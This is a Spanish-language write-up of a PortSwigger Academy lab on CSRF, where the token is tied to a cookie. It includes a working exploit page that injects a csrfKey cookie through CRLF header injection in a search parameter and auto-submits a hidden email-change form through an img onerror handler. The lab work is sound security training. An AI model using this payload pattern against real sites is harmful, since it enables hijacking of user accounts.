---
title: "CSRF where token is tied to non-session cookie"
platform: "PortSwigger"
os: "Windows"
difficulty: "Medium"
ip: "10.10.10.XXX"
slug: "csrf-where-token-is-tied-to-non-session-cookie"
author: "Z4k7"
date: "2026-04-04"
year: "2026"
status: "pwned"
tags:
  - "CSRF"
techniques:
  - "CSRF Token Reuse"
  - "Cookie Injection"
  - "HTTP Response Splitting"
  - "Search Parameter Injection"
tools:
  - "BurpSuite"
  - "Exploit Server"
flags_list:
  - label: "user"
    value: "hash_aqui"
  - label: "root"
    value: "hash_aqui"
summary: "Lab de BurpSuite Academy sobre un ataque CSRF donde la aplicación implementa tokens CSRF vinculados a una cookie (csrfKey), pero de forma débil. El token se valida correctamente, pero la csrfKey es inyectable a través de un parámetro de búsqueda que no valida Set-Cookie. El atacante usa una combinación de inyección de cookie vía parámetro de URL y CSRF para cambiar el email de la víctima, demostrando cómo la validación de cookies puede ser eludida si la aplicación permite manipularlas.  ---"
steps:

  - id: "exploit_1"
    num: "01"
    title: "Objetivo"
    content:
      - kind: "note"
        text: |
          La funcionalidad de cambio de correo electrónico de este laboratorio es vulnerable a ataques CSRF. Utiliza tokens para intentar prevenirlos, pero no están completamente integrados en el sistema de gestión de sesiones del sitio.
          Para resolver el laboratorio, utiliza tu servidor de explotación para alojar una página HTML que utilice un ataque CSRF para cambiar la dirección de correo electrónico del usuario.
          Dispones de dos cuentas en la aplicación que puedes usar para ayudarte a diseñar tu ataque. Las credenciales son las siguientes:
      - kind: "bullet"
        text: "wiener:peter"
      - kind: "bullet"
        text: "carlos:montoya"
      - kind: "callout"
        type: "info"
        label: "Pista"
        text: "No puedes registrar una dirección de correo electrónico que ya esté en uso por otro usuario. Si cambias tu dirección de correo electrónico mientras pruebas tu exploit, asegúrate de usar una dirección diferente para el exploit final que le envíes a la víctima."

  - id: "recon_1"
    num: "02"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Iniciamos el laboratorio y accedemos en la URL:
      - kind: "image"
        src: "assets/images/CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie/file-20260404184019445.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Accedemos en el apartado de login para ingresar con los datos suministrados en el objetivo del laboratorio:
      - kind: "image"
        src: "assets/images/CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie/file-20260404184046487.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Una vez estemos logiados en la web ya contamos con información del usuario actual. El objetivo es tratar de cambiar el correo de la víctima. Se validan las credenciales para los usuarios `wiener:peter` y `carlos:montoya`.
      - kind: "image"
        src: "assets/images/CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie/file-20260404184113303.jpg"
        caption: "Evidencia técnica"
      - kind: "image"
        src: "assets/images/CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie/file-20260404184146684.jpg"
        caption: "Evidencia técnica"
      - kind: "bullet"
        text: "Acceso a URL del laboratorio exitoso"
      - kind: "bullet"
        text: "Credenciales válidas: wiener:peter y carlos:montoya"
      - kind: "bullet"
        text: "Usuario autenticado con sesión activa"
      - kind: "bullet"
        text: "Acceso a sección de cambio de email"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Este lab introduce algo nuevo: hay DOS cookies. La sesión normal, y una `csrfKey` adicional. La pregunta: ¿por qué separar el token en una cookie? ¿Es más seguro? ¿Se puede inyectar la cookie?"

  - id: "enum_1"
    num: "03"
    title: "Enumeración"
    content:
      - kind: "note"
        text: |
          Consultamos el código de la web el apartado del input que permite ingresar datos para el cambio del Email.
      - kind: "code"
        lang: "HTML"
        code: |
          <div id="account-content">
          	<p>Your username is: carlos</p>
              <p>Your email is: <span id="user-email">carlos@carlos-montoya.net</span></p>
              <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
                  <label>Email</label>
                  <input required="" type="email" name="email" value="">
                  <input required="" type="hidden" name="csrf" value="SzmbBnP1nWXWI8u7wQNsL8pWRbwiKnOq">
                  <button class="button" type="submit"> Update email </button>
              </form>
          </div>
      - kind: "note"
        text: |
          El formulario contiene un token CSRF en el cuerpo de la solicitud. Pero además, en las cookies hay un `csrfKey`.
          Al enviar una solicitud POST, las cabeceras incluyen:
      - kind: "code"
        lang: "JS"
        code: |
          POST /my-account/change-email HTTP/2
          Host: 0a5e00d30481b37780680302002f0075.web-security-academy.net
          Cookie: csrfKey=dbDlOAV4RIDXnM4VLVhgIePoyujcgMM2; session=lEthxdevMf1oLM7UhEJLTRzsqAzVKYCk
          Content-Length: 60
          ...
          
          email=hack%40gmail.com&csrf=SzmbBnP1nWXWI8u7wQNsL8pWRbwiKnOq
      - kind: "note"
        text: |
          Observación crítica: hay DOS elementos de seguridad:
          1. El token `csrf` en el body (`SzmbBnP1nWXWI8u7wQNsL8pWRbwiKnOq`)
          2. La cookie `csrfKey` (`dbDlOAV4RIDXnM4VLVhgIePoyujcgMM2`)
          La pregunta es: ¿cómo se valida? ¿Debe `csrf` == `csrfKey`? ¿O son independientes?
      - kind: "callout"
        type: "warning"
        label: "Token Vinculado a Cookie Débil"
        text: "El servidor valida que ambos elementos existan, pero la `csrfKey` es una COOKIE — y las cookies pueden ser inyectadas si la aplicación permite manipulación de headers vía parámetros de URL."
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Las cookies son más fáciles de inyectar que tokens en el body si la aplicación tiene una función de búsqueda (o similar) que no valida caracteres especiales como `%0d%0a` (CRLF). ¿Por qué? Porque `%0d%0a` es sequence HTTP que permite inyectar nuevas líneas — incluyendo nuevas cabeceras."

  - id: "exploit_1"
    num: "04"
    title: "Explotación"
    content:
      - kind: "note"
        text: |
          Estrategia: Inyectar la cookie `csrfKey` vía parámetro de búsqueda, luego enviar el CSRF con el token correspondiente.
          Primero, descubrimos que el sitio tiene una función de búsqueda que guarda datos en el navegador:
      - kind: "image"
        src: "assets/images/CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie/file-20260404211159272.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Si enviamos una búsqueda, los datos se guardan:
      - kind: "image"
        src: "assets/images/CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie/file-20260404211303085.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Ahora usamos esta búsqueda para inyectar una cookie con CRLF (`%0d%0a`):
      - kind: "code"
        lang: "JS"
        code: |
          <form class="login-form" name="change-email-form" action="https://0acc004a04fe97b080183a5c00ec005a.web-security-academy.net/change-email" method="POST">
          <input required type="hidden" name="csrf" value="Iu4PUl9pHQks3awZW4Gu4HKPbETYsMWb">
          <input type="email" name="email" value="hackadmin@gmail.com" />
          </form>
          <img src="https://0acc004a04fe97b080183a5c00ec005a.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=EBOohheHXBRaV7zWdrqYDJSta8vV7DGS%3b%20SameSite=None" onerror="document.forms[0].submit()">
      - kind: "note"
        text: |
          Desglose del ataque:
          1. Tag `<img>` con CRLF injection:
          - La URL contiene `%0d%0a` (carriage return + line feed)
          - Esto "rompe" la respuesta HTTP e inyecta un nuevo header `Set-Cookie`
          - La nueva cookie: `csrfKey=EBOohheHXBRaV7zWdrqYDJSta8vV7DGS`
          2. Cuando la imagen falla (`onerror`):
          - Se ejecuta el JavaScript que envía el formulario POST
          - El formulario incluye un token CSRF válido
          - El navegador de la víctima envía la cookie inyectada (`csrfKey`) que ya está en su navegador
          - Solicitud: `email=...&csrf=token_válido` + Cookie `csrfKey=injected`
          3. Validación del servidor:
          - ¿Está el token? ✓
          - ¿Está la csrfKey cookie? ✓
          - ¿Son válidos? ✓ (porque coinciden)
          - Email cambiado ✅
      - kind: "image"
        src: "assets/images/CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie/file-20260404185150401.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          El servidor rechaza si falta la cookie:
      - kind: "image"
        src: "assets/images/CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie/file-20260404190827354.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Pero si inyectamos la cookie vía CRLF injection, funciona:
      - kind: "image"
        src: "assets/images/CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie/file-20260404214906296.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Anatomía del Bypass — Cookie Injection + CRLF"
        text: "1. Atacante identifica una función de búsqueda sin validación de CRLF 2. Crea URL: `/?search=X%0d%0aSet-Cookie: csrfKey=Y` 3. El servidor responde con un header adicional que SET la cookie 4. Navegador de víctima guarda la cookie inyectada 5. CSRF tradicional: formulario con token + cookie inyectada 6. Servidor valida: ambos elementos presentes ✓ 7. Email cambiado ✅"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Este bypass es SOFISTICADO porque combina dos técnicas: (1) CRLF injection para manipular headers, (2) CSRF tradicional. No es un error del token en sí — es un error de arquitectura: poner CSRF validation en cookies que pueden ser inyectadas."

  - id: "exploit_1"
    num: "05"
    title: "Acceso Inicial"
    content:
      - kind: "note"
        text: |
          Ingresamos en el apartado de `Go to Exploit Server` para simular un servidor atacante:
      - kind: "image"
        src: "assets/images/CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie/file-20260404190843167.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Una vez se cargue el código arbitrario se guarda en el servidor y se envía a la víctima. Para confirmar que la víctima realizó el cambio validamos en el apartado de LOG:
          Se envía el formulario la víctima:
      - kind: "image"
        src: "assets/images/CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie/file-20260404215306097.jpg"
        caption: "Evidencia técnica"
      - kind: "image"
        src: "assets/images/CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie/file-20260404215317647.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          En el apartado de los log del servidor la víctima accede a la web y se realiza la modificación del correo.
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Este lab demuestra un error arquitectónico: poner defensa CSRF en cookies. Las cookies PUEDEN ser inyectadas si hay CRLF injection en la aplicación. La lección: CSRF tokens deben estar en el body o headers, NO en cookies (o si están en cookies, deben estar fuertemente protegidas)."

  - id: "privesc_1"
    num: "06"
    title: "Escalada de Privilegios"
    content:
      - kind: "note"
        text: |
          Este lab no aplica escalada de privilegios directa, pero demuestra cómo una defensa debil puede comprometer múltiples usuarios.
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "La verdadera vulnerabilidad aquí no es 'token débil' — es 'CRLF injection en parámetro de búsqueda'. La defensa CSRF es correcta, pero está minada por otra vulnerabilidad (header injection)."

lessons:
  - 'CSRF tokens en cookies son problemáticos: Las cookies pueden ser inyectadas si hay CRLF injection.'
  - 'CRLF injection permite inyectar cabeceras: `%0d%0a` es muy peligroso si no está validado.'
  - 'Defensa multicapa falla si una capa es débil: CSRF + cookie = seguro. Pero si la cookie es inyectable = vulnerable.'
  - 'Búsqueda sin validación es un vector de ataque: Cualquier parámetro que se refleje en respuesta HTTP puede permitir CRLF injection.'
  - 'La combinación de vulnerabilidades es crítica: Una única CRLF injection + CSRF tradicional = compromiso.'
  - 'CSRF tokens siempre en body o headers seguros: Nunca en cookies manipulables.'
mitigation:
  - 'Validar CRLF en todos los parámetros: Rechazar `%0d`, `%0a`, `\r`, `\n`.'
  - 'CSRF tokens en body, no en cookies: O en headers seguros como `X-CSRF-Token`.'
  - 'Usar SameSite=Strict en cookies CSRF: Aunque haya CRLF injection, SameSite previene el envío.'
  - 'Content Security Policy (CSP): Prevenir inyección de scripts y redirecciones.'
  - 'HttpOnly flag en cookies: Aunque no previene CRLF injection en el servidor.'
  - 'Validar origen HTTP: Rechazar solicitudes de origen diferente (aunque CSRF las envíe con cookies).'
---
